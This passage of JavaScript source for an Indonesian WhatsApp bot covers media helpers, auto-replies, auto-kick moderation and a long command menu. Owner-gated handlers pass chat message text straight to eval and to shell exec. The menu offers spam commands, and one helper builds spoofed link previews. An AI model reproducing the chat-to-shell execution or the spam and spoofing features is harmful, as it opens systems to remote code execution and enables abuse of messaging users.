                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
				}
			}
		}
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					kurr.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
			const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
kurr.sendMessage(to, media, MessageType.sticker,{quoted:mek})
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
} 
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        kurr.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer Kurz Bot Assistan\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        kurr.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await kurr.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        kurr.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			kurr.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"亗 S H I N C H A N 亗",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6282134110253?text=Assalamualaikum ShinChan`}}})
		}
		const simir = (teks) => {
			kurr.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			kurr.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/owner.webp')
			kurr.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticNotAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/notadmin.webp')
			kurr.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/admin.webp')
			kurr.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticWait = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/wait.webp')
			kurr.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/ok.webp')
			kurr.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? kurr.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : kurr.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
kurr.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
kurr.sendMessage(from, hasil, type, options).catch(e => {
kurr.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					kurr.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await kurr.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				kurr.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
if (budy.includes('Assalamualaikum')){
reply('_Waalaikumussalam wr.wb._')
}
if (budy.includes('Bot')) {
const loli = fs.readFileSync('./assets/loli.mp3');
kurr.sendMessage(from, loli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('bot')) {
const loli = fs.readFileSync('./assets/loli.mp3');
kurr.sendMessage(from, loli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
//Sapaan
if (budy.includes('Hai')) {
const hai = fs.readFileSync('./assets/hai.mp3');
kurr.sendMessage(from, hai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('Hallo')) {
const hai = fs.readFileSync('./assets/hai.mp3');
kurr.sendMessage(from, hai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('hallo')) {
const hai = fs.readFileSync('./assets/hai.mp3');
kurr.sendMessage(from, hai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('halo')) {
const hai = fs.readFileSync('./assets/hai.mp3');
kurr.sendMessage(from, hai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('hai')) {
const hai = fs.readFileSync('./assets/hai.mp3');
kurr.sendMessage(from, hai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
//menu
if (budy.includes('menu')) {
const menu = fs.readFileSync('./assets/menu.mp3');
kurr.sendMessage(from, menu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('allmenu')) {
const allmenu = fs.readFileSync('./assets/dj.mp3');
kurr.sendMessage(from, allmenu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
if (budy.includes('help')) {
const menu = fs.readFileSync('./assets/menu.mp3');
kurr.sendMessage(from, menu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
}
           if (budy.startsWith('>')){
if (!isOwner && !mek.key.fromMe) return
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{c
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('x')){
if (!mek.key.fromMe && !isOwner) return
try {
return kurr.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
			// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					kurr.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					kurr.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					kurr.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
				  }
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 2500) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        kurr.groupRemove(from, sender);
      }
			}
        if (budy.includes("wa.me/","https://wa.me//","https://wa.me/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiWame) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				kurr.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Wa.me terdeteksi Auto kick!')
			    kurr.groupRemove(from, [kic]).catch((e) => { sticNotAdmin(from) })
            }
        }
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				kurr.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    kurr.groupRemove(from, [kic]).catch((e) => { sticNotAdmin(from) })
			}
			}
			if (!m.key.fromMe && bad.includes(messagesD)) {
			ano = fs.readFileSync('./sticker/anime/toxic.webp')
			kurr.sendMessage(from, ano, sticker, { quoted: mek})
				}
				
	//AUTO SETTING VN, READ, MENGETIK
if (!isCmd && mek.message && autovn) {for (let i of totalchat) {await kurr.updatePresence(i.jid, Presence.recording)}}
if (!isCmd && mek.message && autotype) {for (let i of totalchat) {await kurr.updatePresence(i.jid, Presence.composing)}}  //unavailable, available, composing, recording, paused
if (!isCmd && autoread) {for (let i of totalchat) {await kurr.chatRead(from, "read")}}

if (budy.startsWith('Chan')){
sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
}
if(isButton == 'igm'){
reply('https://instagram.com/quotes.thenay_')
}
if(isButton == 'ytm'){
reply('https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ')
}

   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
       
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
		
		//runtime berjalan
           runi = process.uptime() 
           kurr.setStatus(`Bot Active During ${kyun(runi)} `).catch((_)=>_);

           settingstatus = new Date() * 1;
           
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Reply stickernya bgsd!')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
        switch (command) {
        	case 'menu':
        case 'help':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
        if(menusimpel == false){
           stod = `${sender}`
fill =`Hai Kak ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu
😈Im Bot😈
Jika','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋ Button Tidak Muncul Ketik .allmenu`
menu =`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},
{buttonId:`ig`,buttonText:{displayText:'INSTAGRAM'},type:1},
]
mhan = await kurr.prepareMessage(from, ofrply, image, {thumbnail: fs.readFileSync('./media/thumb.jpg')})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
kurr.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": fs.readFileSync('./media/thumb.jpg'),
},mentionedJid:[stod]}, quoted : ftrol})
}
else if(menusimpel = true){
        stod = `${sender}`
       stst = await kurr.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
       menu = `┌───「 \`\`\`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗\`\`\` 」
│
☬ _Creator : *⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗* 
☬ _Battery : ${baterai.battery}_
☬ _Mode : ${publik ? 'Public' : 'Self'}_
☬ _Total Hit : ${cmhit.length}_
☬ _Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}_
│
☬───「 \`\`\`INFO BOT\`\`\` 」
│
☬ _Nama Bot : ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗
☬ _Nama Owner : ${NamaOwner}_
☬ _Nomor Owner : @${otod.split('@')[0]}_
☬ _Auto Composing : ${settings.autocomposing}_
☬ _Auto Recording : ${settings.autorecording}_
│
☬───「 \`\`\`INFO USER\`\`\` 」
│
☬ _Status : ${isOwner ? 'Owner' : 'User'}_
☬ _Nama : ${pushname}_
☬ _Bio : ${stst}_
☬ _Nomor : @${stod.split('@')[0]}_
☬ _Info Nomor : ${num.data.country_code} - ${num.data.carrier.type} - ${num.data.carrier.name}_
│
└───「 \`\`\`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗\`\`\` 」`
sendButLocation(from, `${menu}`, "*_© ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*", {jpegThumbnail:ofrply,name:""}, [{buttonId:`command`,buttonText:{displayText:'BUTTON MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
break
case 'allmenu': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
stod = `${sender}`
       stst = await kurr.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = '〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️'
       ownerJid = "6282134110253@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			
menunya = `╭─❒ 「 Bot Info 」 ❒
☬ _Creator : *⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗*
☬ _Battery : ${baterai.battery}_
☬ _Mode : ${publik ? 'Public' : 'Self'}_
☬ _Total Hit : ${cmhit.length}_
☬ _Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}_
☬ _Nama Bot : ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗
☬ _Nama Owner : ${NamaOwner}_
☬ _Nomor Owner : @${otod.split('@')[0]}_
☬ _Auto Composing : ${settings.autocomposing}_
☬ _Auto Recording : ${settings.autorecording}_
└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱

╭─❒ 「 User Info 」 ❒
☬ _Status : ${isOwner ? 'Owner' : 'User'}_
☬ _Nama : ${pushname}_
☬ _Bio : ${stst}_
☬ _Nomor : @${stod.split('@')[0]}_
└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱

┌❏ TO DAY
│ ${tampilUcapan}
☬ Jam : ${jmn}
☬ Hari : ${week} ${weton}
☬ Tanggal : ${calender}
└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱

┌❏ INDONESIA TIME
☬ Wib : ${timeWib}
☬ Wita : ${timeWita}
☬ Wit : ${timeWit}  
└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱

╭─❒ COMMAND
│
☬─❲ OWNER ❳─☬ツ
☬ ${prefix}autorespon [ _on/off_ ]
☬ ${prefix}autovn [ _on/off_ ]
☬ ${prefix}autotype [ _on/off_ ]
☬ ${prefix}autoread [ _on/off_ ]
☬ ${prefix}antidelete [ _on/off_ ]
☬ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
☬ ${prefix}tobc [ _reply sticker/audio with caption_ ]
☬ ${prefix}return [ _javascript_ ]
☬ ${prefix}clearall
☬ ${prefix}delchat
☬ ${prefix}mute
☬ ${prefix}unmute
☬ ${prefix}public
☬ ${prefix}self
☬ ${prefix}spam [ _teks|jumlah_ ]
☬ ${prefix}demoteall
☬ ${prefix}promoteall
☬ ${prefix}addcmd [ _teks reply stc_ ]
☬ ${prefix}delcmd [ _reply stc_ ]
☬ ${prefix}listcmd
☬ ${prefix}spamsw [ _teks|jumlah_ ]
☬ ${prefix}upswteks [ _teks_ ]
☬ ${prefix}upswlokasi [ _teks_ ]
☬ ${prefix}upswaudio [ _reply audio_ ]
☬ ${prefix}upswvoice [ _reply audio_ ]
☬ ${prefix}upswsticker [ _reply sticker_ ]
☬ ${prefix}upswimage [ _reply image with caption_ ]
☬ ${prefix}upswgif [ _reply gif with caption_ ]
☬ ${prefix}upswvideo [ _reply video with caption_ ]
☬ ${prefix}shutdown
☬ ${prefix}offline [ _alasan_ ]
☬ ${prefix}online
☬ ${prefix}exif [ _nama|author_ ]
☬ ${prefix}setprofile [ _reply image_ ]
☬ ${prefix}setname [ _teks_ ]
☬ ${prefix}setprefix [ _multi/nopref/prefix_ ]
☬ ${prefix}setbio [ _teks_ ]
☬ ${prefix}leave
☬ ${prefix}restart
☬ ${prefix}addrespon [ _tanya|jawab_ ]
☬ ${prefix}delrespon [ _nama_ ]
☬ ${prefix}listrespon
☬ ${prefix}readall
☬ ${prefix}unreadall
☬ ${prefix}archive
☬ ${prefix}unarchiveall
☬ ${prefix}pin
☬ ${prefix}unpin
☬ ${prefix}setmenu [ _ori/simpel_ ]
☬ ${prefix}setallmenu [ _ori/simpel_ ]
☬ ${prefix}leavetime [ _detik/menit/jam_ ]
☬ ${prefix}bukatime [ _detik/menit/jam_ ]
☬ ${prefix}tutuptime [ _detik/menit/jam_ ]
☬ ${prefix}nano [ _nama file_ ]
│
☬─❲ NEW ❳─☬ツ
☬ ${prefix}jadibot
☬ ${prefix}stopjadibot
│
☬─❲ DOWNLOAD ❳─☬ツ
☬ ${prefix}infogempa
☬ ${prefix}herolist
☬ ${prefix}herodetail [ _hero_ ]
☬ ${prefix}google [ _search_ ]
☬ ${prefix}gimage [ _search_ ]
☬ ${prefix}wiki [ _search_ ]
☬ ${prefix}mediafire [ _link_ ]
☬ ${prefix}ytsearch [ _judul_ ]
☬ ${prefix}ytmp4 [ _link yt_ ]
☬ ${prefix}ytmp3 [ _link yt_ ]
☬ ${prefix}play [ _judul lagu_ ]
☬ ${prefix}video [ _judul video_ ]
☬ ${prefix}tinyurl [ _link_ ]
☬ ${prefix}fetch [ _link_ ]
☬ ${prefix}igdl [ _link_ ]
☬ ${prefix}tiktokdl [ _link_ ]
☬ ${prefix}pinterest [ _search_ ]
☬ ${prefix}lirik [ _judul_ ]
☬ ${prefix}tourl [ _reply image/video_ ]
☬ ${prefix}resepmasakan [ _judul_ ]
☬ ${prefix}artimimpi [ _teks_ ]
☬ ${prefix}bilangangka [ _angka_ ]
☬ ${prefix}kalkulator [ _angka_ ]
☬ ${prefix}fancytext [ _teks_ ]
☬ ${prefix}githubstalk [ _username_ ]
☬ ${prefix}translate [ _teks kodebhs_ ]
☬ ${prefix}ss [ _link_ ]
☬ ${prefix}playstore [ _search_ ]
☬ ${prefix}tiktokaudio [ _link_ ]
☬ ${prefix}brainly [ _search_ ]
☬ ${prefix}igstory [ _search_ ]
☬ ${prefix}igstalk [ _link_ ]
☬ ${prefix}twitter [ _link_ ]
☬ ${prefix}twmp3 [ _link_ ]
☬ ${prefix}linkwa [ _search_ ]
☬ ${prefix}fb [ _link_ ]
☬ ${prefix}chara [ _search_ ]
☬ ${prefix}otaku [ _search_ ]
☬ ${prefix}komiku [ _search_ ]
│
☬─❲ MAKER MENU ❳─☬ツ
冬 ${prefix}blackpink
冬 ${prefix}neon
冬 ${prefix}greenneon
冬 ${prefix}advanceglow
冬 ${prefix}futureneon
冬 ${prefix}sandwriting
冬 ${prefix}sandsummer
冬 ${prefix}sandengraved
冬 ${prefix}metaldark
冬 ${prefix}neonlight
冬 ${prefix}holographic
冬 ${prefix}text1917
冬 ${prefix}minion
冬 ${prefix}deluxesilver
冬 ${prefix}newyearcard
冬 ${prefix}bloodfrosted
冬 ${prefix}halloween
冬 ${prefix}jokerlogo
冬 ${prefix}fireworksparkle
冬 ${prefix}natureleaves
冬 ${prefix}bokeh
冬 ${prefix}toxic
冬 ${prefix}strawberry
冬 ${prefix}box3d
冬 ${prefix}roadwarning
冬 ${prefix}breakwall
冬 ${prefix}icecold
冬 ${prefix}luxury
冬 ${prefix}cloud
冬 ${prefix}summersand
冬 ${prefix}horrorblood
冬 ${prefix}thunder
冬 ${prefix}pornhub
冬 ${prefix}glitch
冬 ${prefix}avenger
冬 ${prefix}space
冬 ${prefix}ninjalogo
冬 ${prefix}marvelstudio
冬 ${prefix}lionlogo
冬 ${prefix}wolflogo
冬 ${prefix}steel3d
冬 ${prefix}wallgravity
冬 ${prefix}shadow
冬 ${prefix}cup
冬 ${prefix}cup1
冬 ${prefix}romance
冬 ${prefix}smoke
冬 ${prefix}burnpaper
冬 ${prefix}lovemessage
冬 ${prefix}undergrass
冬 ${prefix}love
冬 ${prefix}coffe
冬 ${prefix}woodheart
冬 ${prefix}woodenboard
冬 ${prefix}summer3d
冬 ${prefix}wolfmetal
冬 ${prefix}nature3d
冬 ${prefix}underwater
冬 ${prefix}golderrose
冬 ${prefix}summernature
冬 ${prefix}letterleaves
冬 ${prefix}glowingneon
冬 ${prefix}fallleaves
冬 ${prefix}flamming
冬 ${prefix}harrypotter
冬 ${prefix}carvedwood
冬 ${prefix}arcade8bit
冬 ${prefix}battlefield4
冬 ${prefix}pubg
冬 ${prefix}wetglass
冬 ${prefix}multicolor3d
冬 ${prefix}watercolor
冬 ${prefix}luxurygold
冬 ${prefix}galaxywallpaper
冬 ${prefix}lighttext
冬 ${prefix}beautifulflower
冬 ${prefix}puppycute
冬 ${prefix}royaltext
冬 ${prefix}heartshaped
冬 ${prefix}birthdaycake
冬 ${prefix}galaxystyle
冬 ${prefix}hologram3d
冬 ${prefix}greenneon
冬 ${prefix}glossychrome
冬 ${prefix}greenbush
冬 ${prefix}metallogo
冬 ${prefix}noeltext
冬 ${prefix}glittergold
冬 ${prefix}textcake
冬 ${prefix}starsnight
冬 ${prefix}wooden3d
冬 ${prefix}textbyname
冬 ${prefix}writegalacy
冬 ${prefix}galaxybat
冬 ${prefix}snow3d
冬 ${prefix}birthdayday
冬 ${prefix}goldplaybutton
冬 ${prefix}silverplaybutton
冬 ${prefix}freefire
冬 ${prefix}foliokanan [ _text_ ]
冬 ${prefix}foliokiri [ _text_ ]
冬 ${prefix}nuliskanan [ _text_ ]
冬 ${prefix}nuliskiri [ _text_ ]
冬 ${prefix}maker3d [ _text_ ]
